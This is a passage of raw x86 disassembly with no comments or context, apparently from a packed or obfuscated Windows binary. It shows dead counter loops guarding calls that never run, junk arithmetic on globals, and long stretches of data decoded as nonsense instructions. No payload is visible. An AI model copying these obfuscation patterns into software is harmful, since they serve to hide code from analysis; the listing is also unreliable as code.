  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4245be,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x421896
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x4225c60a
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	enter  0x90f0,0x26
  409492:	arpl   WORD PTR [edx],si
  409494:	adc    bl,al
  409496:	sub    DWORD PTR [edx-0x44c2203e],edi
  40949c:	dec    esi
  40949d:	cld    
  40949e:	xchg   esi,eax
  40949f:	test   al,0x63
  4094a1:	rol    edi,cl
  4094a3:	outs   dx,DWORD PTR ds:[esi]
  4094a4:	xor    al,0x9f
  4094a6:	push   0xffffffbd
  4094a8:	in     al,dx
  4094a9:	hlt    
  4094aa:	jge    0x4094a2
  4094ac:	lock test al,0x29
  4094af:	xchg   DWORD PTR [edi],eax
  4094b1:	xor    al,0x1
  4094b3:	mov    edx,0xe786f09f
  4094b8:	add    bh,BYTE PTR [ebp-0x62]
  4094bb:	stos   BYTE PTR es:[edi],al
  4094bc:	xchg   esi,eax
  4094bd:	retf   0x89b8
  4094c0:	and    DWORD PTR [ecx-0x2f32c26c],ebp
  4094c6:	and    bh,ch
  4094c8:	pop    esp
  4094c9:	call   0x40a6f4e0
  4094ce:	push   ebp
  4094cf:	xchg   ebx,eax
  4094d0:	sub    eax,0x6ccc68b6
  4094d5:	mov    esp,0x7223ef98
  4094da:	pop    es
  4094db:	enter  0xc2e2,0x54
  4094df:	adc    BYTE PTR [edx-0x3cf6d7f8],dl
  4094e5:	add    ebp,DWORD PTR [edi]
  4094e7:	es pop es
  4094e9:	repnz lea esp,ss:[esi+0xe]
  4094ee:	adc    DWORD PTR [ecx-0x36],esi
  4094f1:	cmp    cl,dl
  4094f3:	aaa    
  4094f4:	adc    eax,0x3181f241
  4094f9:	push   ss
  4094fa:	daa    
  4094fb:	test   al,0x29
  4094fd:	xor    eax,0x4e544b99
  409502:	xor    cl,BYTE PTR [ecx+0x29286b18]
  409508:	iret   
  409509:	loop   0x409565
  40950b:	inc    edi
  40950c:	xchg   esp,eax
  40950d:	mov    edx,0xa8e33983
  409512:	cli    
  409513:	in     eax,0x42
  409515:	and    ecx,DWORD PTR [esi-0x34b1b476]
  40951b:	shl    DWORD PTR [esi-0x52],0xf0
  40951f:	(bad)  
  409520:	fwait
  409521:	sahf   
  409522:	mov    esi,DWORD PTR [ebp+0x10]
  409525:	mov    DWORD PTR [esi+0x10],eax
  409528:	mov    eax,eax
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    bl,dh
  40953f:	bound  esp,QWORD PTR [ebx+0x7e21090d]
  409545:	jle    0x4094c9
  409547:	jle    0x4095c7
  409549:	jle    0x4094f6
  40954b:	hlt    
  40954c:	and    dh,BYTE PTR [ebx-0x40]
  40954f:	(bad)  
  409550:	rcr    DWORD PTR [esi],cl
  409552:	and    eax,0x1577e0dc
  409557:	int    0xf9
  409559:	push   edi
  40955a:	push   cs
  40955b:	sbb    bh,cl
  40955d:	icebp  
  40955e:	loop   0x40951b
  409560:	data16 fimul WORD PTR [esi-0x24bac2c8]
  409567:	cmp    al,0x94
  409569:	jb     0x409514
  40956b:	push   ebp
  40956c:	mov    ebp,0xada6b7f1
  409571:	pushf  
  409572:	test   eax,0x403f5937
  409577:	jecxz  0x40952b
  409579:	imul   edi,edi,0xffffffec
  40957c:	clc    
  40957d:	(bad)  
  40957e:	inc    eax
  40957f:	rcr    BYTE PTR [ebp-0x109c3179],cl
  409585:	out    dx,al
  409586:	ins    DWORD PTR es:[edi],dx
  409587:	add    bh,BYTE PTR [eax+edi*2]
  40958a:	push   edi
  40958b:	test   eax,0xac5643e3
  409590:	stos   BYTE PTR es:[edi],al
  409591:	add    al,al
  409593:	mov    edx,0x61a8bf2b
  409598:	mov    eax,0x3684ee75
  40959d:	pop    edi
  40959e:	cmp    al,0x7
  4095a0:	in     eax,0xd
  4095a2:	ins    DWORD PTR es:[edi],dx
  4095a3:	and    bh,bl
  4095a5:	stos   BYTE PTR es:[edi],al
  4095a6:	xchg   ecx,eax
  4095a7:	adc    al,0x77
  4095a9:	pop    es
  4095aa:	push   edi
  4095ab:	iret   
  4095ac:	icebp  
  4095ad:	call   0xc4fc60a3
  4095b2:	jns    0x40961f
  4095b4:	sub    esi,0x7a7232
  4095ba:	cmp    edi,DWORD PTR [esi-0x67519707]
  4095c0:	jmp    0x29565d67
  4095c5:	adc    edx,ecx
  4095c7:	xchg   edx,eax
  4095c8:	mov    ebp,0x73e2149f
  4095cd:	or     ebx,DWORD PTR [ebp+0xf]
  4095d0:	cs cdq 
  4095d2:	mov    dl,0xbe
  4095d4:	scas   eax,DWORD PTR es:[edi]
  4095d5:	mov    edx,0x105d6fd2
  4095da:	push   edi
  4095db:	call   0xc173a3fa
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    ebx,edi
  40961c:	mov    esi,DWORD PTR [ebp+0x0]
  40961f:	popf   
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x409626
  409628:	(bad)  
  40962a:	jbe    0x40964f
  40962c:	sti    
  40962d:	test   DWORD PTR [ebp-0x71],ebx
  409630:	arpl   WORD PTR [esp+ebp*4-0x1a],si
  409634:	aaa    
  409635:	mov    bh,0xda
  409637:	jecxz  0x409672
  409639:	imul   eax,DWORD PTR [ebp+0x7ec2e8c7],0xe85f46c3
  409643:	mov    cs,WORD PTR ds:0x18ce558
  409649:	push   ebx
  40964a:	add    al,0x72
  40964c:	ret    
  40964d:	(bad)  
  409651:	fisub  DWORD PTR [ebx-0x7b]
  409654:	daa    
  409655:	in     al,dx
  409656:	daa    
  409657:	out    0x2e,al
  409659:	in     eax,dx
  40965a:	outs   dx,BYTE PTR ds:[esi]
  40965b:	iret   
  40965c:	push   ecx
  40965d:	and    DWORD PTR cs:[ebx+0x2eaa18bf],0x968fb6d0
  409668:	adc    esp,DWORD PTR [bp+di+0x4d]
  40966c:	aad    0x34
  40966e:	(bad)  
  409670:	push   ebp
  409671:	xor    al,0x33
  409673:	(bad)  [edi*1+0x10136088]
  40967a:	outs   dx,DWORD PTR ds:[esi]
  40967b:	data16 dec bh
  40967e:	test   al,0x8e
  409680:	mov    eax,ds:0xd796365a
  409685:	daa    
  409686:	cwde   
  409687:	mov    al,BYTE PTR [esp+eiz*4]
  40968a:	ins    DWORD PTR es:[edi],dx
  40968b:	sbb    eax,esi
  40968d:	push   ss
  40968e:	push   cs
  40968f:	in     eax,0xee
  409691:	shl    eax,cl
  409693:	mov    dl,0x77
  409695:	dec    esp
  409696:	jg     0x4096f0
  409698:	imul   ebp,DWORD PTR [esi+ebx*4],0x4442719e
  40969f:	xchg   esi,ebx
  4096a1:	or     ch,BYTE PTR [edx-0x2f]
  4096a4:	ror    BYTE PTR [edx-0x77646240],1
  4096aa:	inc    esi
  4096ab:	(bad)  
  4096ac:	pop    eax
  4096ad:	inc    edi
  4096ae:	push   eax
  4096af:	(bad)  
  4096b0:	(bad)  
  4096b2:	mov    DWORD PTR [esi],esi
  4096b4:	shl    al,0x67
  4096b7:	xor    esp,DWORD PTR [esi-0x66c2fcb1]
  4096bd:	mov    ah,0xa2
  4096bf:	aad    0x2
  4096c1:	and    esi,0xe7b1eb91
  4096c7:	add    DWORD PTR [ebx-0x33a6a598],edi
  4096cd:	into   
  4096ce:	add    DWORD PTR [ebp-0x59050e73],ebx
  4096d4:	jmp    0x640e:0xebfacf3b
  4096db:	xor    esp,DWORD PTR [eax+0x7e05363a]
  4096e1:	shr    BYTE PTR [esi+0x73],1
  4096e4:	ins    DWORD PTR es:[edi],dx
  4096e5:	mov    bl,0xe0
  4096e7:	sahf   
  4096e8:	inc    ecx
  4096e9:	outs   dx,BYTE PTR ds:[esi]
  4096ea:	js     0x4096dd
  4096ec:	jmp    0xf9a3:0x413f7c22
  4096f3:	jl     0x4096f5
  4096f5:	mov    dh,0x49
  4096f7:	xchg   edx,eax
  4096f8:	pushf  
  4096f9:	sar    DWORD PTR [esi+0x18],1
  4096fc:	test   BYTE PTR [ecx-0xc428055],0x14
  409703:	retf   0xce61
  409706:	mov    eax,ds:0x9ce5a8d7
  40970b:	pop    ebp
  40970c:	out    dx,al
  40970d:	mov    cl,0xe8
  40970f:	shr    bl,1
  409711:	shl    BYTE PTR [edi],1
  409713:	sub    DWORD PTR [ebx+ecx*8+0x59],edi
  409717:	repz or eax,0x5b06c81b
  40971d:	xlat   BYTE PTR ds:[ebx]
  40971e:	push   esp
  40971f:	fmul   DWORD PTR [ebp-0x1e]
  409722:	into   
  409723:	sar    DWORD PTR [ebx+0x69f29c5a],0xac
  40972a:	jmp    0x409785
  40972c:	pop    edi
  40972d:	iret   
  40972e:	test   BYTE PTR [ebx-0x20],ah
  409731:	add    al,0xc1
  409733:	mov    dh,dh
  409735:	stc    
  409736:	test   DWORD PTR [ebx+0x38],0x38c754d6
  40973d:	push   ebp
  40973e:	mov    al,0xeb
  409740:	cli    
  409741:	scas   al,BYTE PTR es:[edi]
  409742:	shl    BYTE PTR [edx+0x5032f13b],cl
  409748:	dec    ebp
  409749:	lea    edx,[ecx+0x5]
  40974c:	jge    0x409711
  40974e:	cmp    al,0x51
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4245ae,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4245ca,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4245ba
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	les    edx,FWORD PTR fs:[edx]
  4097c2:	icebp  
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097ff
  4097cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097cd:	repz call 0x39f7:0x745f8a23
  4097d5:	stc    
  4097d6:	test   DWORD PTR [ebx+0x3e3808da],esi
  4097dc:	or     al,BYTE PTR [edi]
  4097de:	mov    edi,0xb69c889
  4097e3:	sar    DWORD PTR [esi+ebx*4+0x1c],0xb1
  4097e8:	rcl    DWORD PTR [ebp-0x9b8c732],0xd1
  4097ef:	fs stc 
  4097f1:	mov    bh,0xb5
  4097f3:	or     eax,0x2fceb0ca
  4097f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f9:	pop    ebx
  4097fa:	mov    dl,0x53
  4097fc:	out    0x5c,eax
  4097fe:	jge    0x40983f
  409800:	pop    esp
  409801:	or     al,0xec
  409803:	fild   QWORD PTR [ebx+0x10715a11]
  409809:	lea    ebp,[ebx-0x6f061104]
  40980f:	xchg   esp,eax
  409810:	inc    ecx
  409811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409812:	ret    0xea15
  409815:	adc    DWORD PTR [edi-0x7917710c],ebp
  40981b:	int3   
  40981c:	mov    dl,0xb8
  40981e:	push   0x1d34a227
  409823:	mov    edx,0x1cf72a3c
  409828:	mov    ah,0xdf
  40982a:	push   ebp
  40982b:	outs   dx,BYTE PTR ds:[esi]
  40982c:	fs sti 
  40982e:	mov    esp,0x493c9f3
  409833:	stos   BYTE PTR es:[edi],al
  409834:	inc    edx
  409835:	sub    eax,0xbaee4659
  40983a:	and    esi,DWORD PTR [esi]
  40983c:	popf   
  40983d:	xchg   ecx,eax
  40983e:	retf   0xcdcc
  409841:	mov    DWORD PTR [ebp-0x80],0x241fbd80
  409848:	sbb    eax,0x2301b95
  40984d:	retf   
  40984e:	fmul   DWORD PTR [edx+ebx*4+0x40212273]
  409855:	aaa    
  409856:	mov    cl,0xe5
  409858:	or     DWORD PTR [ecx+0x2e31beee],ebp
  40985e:	jb     0x409814
  409860:	dec    edx
  409861:	push   0xa6f4addd
  409866:	adc    eax,0x80ad2891
  40986b:	repnz mov eax,ds:0x95c5baf4
  409871:	mov    dl,0xdb
  409873:	test   eax,0x51e7325a
  409878:	retf   
  409879:	rol    DWORD PTR [ecx-0x50],0x60
  40987d:	lock retf 
  40987f:	int    0xea
  409881:	fyl2xp1 
  409883:	js     0x409877
  409885:	xor    DWORD PTR [ebx-0x78],0xaec652e7
  40988c:	enter  0x4bce,0x11
  409890:	pop    ds
  409891:	xor    eax,0x369b9638
  409896:	add    eax,0xc4db1d91
  40989b:	push   eax
  40989c:	dec    ecx
  40989d:	leave  
  40989e:	pop    esp
  40989f:	dec    esi
  4098a0:	dec    ebx
  4098a1:	jno    0x409878
  4098a3:	sub    ah,BYTE PTR [eax-0x6a70346c]
  4098a9:	shr    cl,cl
  4098ab:	inc    edi
  4098ac:	aaa    
  4098ad:	lods   al,BYTE PTR ds:[esi]
  4098ae:	mov    eax,ds:0xa1ecb734
  4098b3:	jbe    0x40991e
  4098b5:	inc    edi
  4098b6:	ins    BYTE PTR es:[edi],dx
  4098b7:	lds    ebp,FWORD PTR [eax+0x73]
  4098ba:	inc    esi
  4098bb:	clc    
  4098bc:	sti    
  4098bd:	in     eax,0x43
  4098bf:	loope  0x409919
  4098c1:	inc    esi
  4098c2:	dec    ebx
  4098c3:	ret    
  4098c4:	addr16 jmp 0x4078:0xe947355f
  4098cc:	in     al,dx
  4098cd:	out    0xea,al
  4098cf:	sbb    BYTE PTR [ecx],0x4c
  4098d2:	ret    
  4098d3:	jp     0x409855
  4098d5:	sub    bh,BYTE PTR [edx+0x67dbf667]
  4098db:	or     al,0xce
  4098dd:	adc    BYTE PTR [ebx+ebp*1+0x5c1da619],bl
  4098e4:	cld    
  4098e5:	xchg   ecx,eax
  4098e6:	add    BYTE PTR [edx+0x76],al
  4098e9:	sbb    al,ch
  4098eb:	mul    ah
  4098ed:	pop    esi
  4098ee:	stos   BYTE PTR es:[edi],al
  4098ef:	ss adc al,0xb2
  4098f2:	sub    al,0x8b
  4098f4:	inc    ebp
  4098f5:	adc    al,0x81
  4098f7:	and    eax,0x412364
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0xad8e3b4c
  409977:	es ins DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x409922
  409981:	sbb    BYTE PTR [eax],0x4c
  409984:	sub    eax,0x18d963a5
  409989:	and    esi,esp
  40998b:	hlt    
  40998c:	xor    eax,0xb92eed38
  409991:	sub    eax,0x85979736
  409996:	in     eax,0xd9
  409998:	inc    eax
  409999:	fisubr DWORD PTR [eax]
  40999b:	mov    esi,0xc4fd3f16
  4099a0:	jnp    0x409a00
  4099a2:	out    dx,eax
  4099a3:	xor    bl,cl
  4099a5:	loope  0x40996f
  4099a7:	cmp    esp,DWORD PTR [edx+0x51]
  4099aa:	sub    al,BYTE PTR [ebx+0x67dc6f5d]
  4099b0:	sbb    DWORD PTR [edi+eiz*1],ebx
  4099b3:	ret    0xf99a
  4099b6:	ins    BYTE PTR es:[edi],dx
  4099b7:	cli    
  4099b8:	adc    eax,0xab12a168
  4099bd:	sar    BYTE PTR [ebp+0x60],0x4d
  4099c1:	repz jle 0x4099aa
  4099c4:	scas   eax,DWORD PTR es:[edi]
  4099c5:	or     al,0xb5
  4099c7:	xlat   BYTE PTR ds:[ebx]
  4099c8:	inc    eax
  4099c9:	sub    dh,al
  4099cb:	out    dx,al
  4099cc:	mov    al,ds:0xc8abb0fe
  4099d1:	dec    ebx
  4099d2:	repz fild WORD PTR [eax]
  4099d5:	push   edi
  4099d6:	adc    BYTE PTR [edi+0x69],al
  4099d9:	xor    edi,DWORD PTR [edx-0x69]
  4099dc:	add    BYTE PTR [eax],ah
  4099de:	xlat   BYTE PTR ds:[ebx]
  4099df:	repnz cmp eax,0x71f90033
  4099e5:	popa   
  4099e6:	jb     0x4099e2
  4099e8:	cmc    
  4099e9:	ss cld 
  4099eb:	sub    esi,0xf
  4099ee:	cdq    
  4099ef:	scas   eax,DWORD PTR es:[edi]
  4099f0:	lods   eax,DWORD PTR ds:[esi]
  4099f1:	pop    ebp
  4099f2:	jbe    0x409a62
  4099f4:	test   BYTE PTR [edx],bl
  4099f6:	cmc    
  4099f7:	xchg   edi,edx
  4099f9:	xchg   edx,eax
  4099fa:	xor    al,0x13
  4099fc:	mov    BYTE PTR [ebx-0x55],ah
  4099ff:	xor    al,0xd5
  409a01:	mov    dh,0x9c
  409a03:	xchg   ecx,eax
  409a04:	in     eax,dx
  409a05:	xchg   ecx,eax
  409a06:	push   esp
  409a07:	mov    eax,DWORD PTR [ebx+eiz*8]
  409a0a:	and    eax,0xeda1f938
  409a0f:	dec    edx
  409a10:	idiv   DWORD PTR [ebp-0x7ae961df]
  409a16:	inc    edi
  409a17:	outs   dx,DWORD PTR ds:[esi]
  409a18:	xlat   BYTE PTR ds:[ebx]
  409a19:	into   
  409a1a:	mov    esi,0xd69cc837
  409a1f:	shr    bl,0xbd
  409a22:	imul   eax,DWORD PTR [edi+0x75],0xffffffd4
  409a26:	push   0x5
  409a28:	call   0x35aef7e
  409a2d:	loop   0x409a29
  409a2f:	cmp    dl,bl
  409a31:	cld    
  409a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a33:	out    dx,eax
  409a34:	scas   eax,DWORD PTR es:[edi]
  409a35:	push   edx
  409a36:	sbb    al,BYTE PTR [ebx-0x7dc832ab]
  409a3c:	mov    ecx,0x1258b74c
  409a41:	ret    0x2fab
  409a44:	sub    BYTE PTR [ecx-0x5da0243a],al
  409a4a:	sub    BYTE PTR [esi-0x3c29928d],ch
  409a50:	or     ebx,ebp
  409a52:	sub    DWORD PTR [ecx+0x1e],esi
  409a55:	jne    0x409a1e
  409a57:	mov    ah,0x1c
  409a59:	push   esi
  409a5a:	sbb    dl,BYTE PTR ds:0xd9885948
  409a60:	dec    ebp
  409a61:	loopne 0x409a1a
  409a63:	push   edi
  409a64:	int    0x2b
  409a66:	(bad)  
  409a68:	stos   BYTE PTR es:[edi],al
  409a69:	or     esi,DWORD PTR [edi+ecx*1]
  409a6c:	xor    DWORD PTR [edi],0x51c1f2a1
  409a72:	xchg   DWORD PTR [bx+0xf],ecx
  409a76:	xchg   ebx,eax
  409a77:	mov    al,ds:0x5cb6c3b0
  409a7c:	dec    bl
  409a7e:	je     0x409a8b
  409a80:	inc    eax
  409a81:	dec    ebx
  409a82:	xchg   ecx,eax
  409a83:	mov    bl,BYTE PTR [edx+eiz*2+0x321edaee]
  409a8a:	jl     0x409a32
  409a8c:	xchg   BYTE PTR [ebp+0x2a43f30f],ch
  409a92:	add    ah,BYTE PTR [ebx+0x7d47de94]
  409a98:	fstp   DWORD PTR [ebx-0x5d]
  409a9b:	pop    es
  409a9c:	jne    0x409a63
  409a9e:	aas    
  409a9f:	and    BYTE PTR [eax+edi*1],0x79
  409aa3:	add    al,0xee
  409aa5:	js     0x409a4d
  409aa7:	cmp    al,0x89
  409aa9:	inc    edx
  409aaa:	or     BYTE PTR [ebx+0x558b1c45],cl
  409ab0:	adc    BYTE PTR [ecx+0x458b0c42],cl
  409ab6:	and    BYTE PTR [ebx+0x42891055],cl
  409abc:	adc    BYTE PTR [ebx+0x14458bc0],cl
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4245b6
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4245c2,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4245c2,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4245b2
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4245c2,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4245b2,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
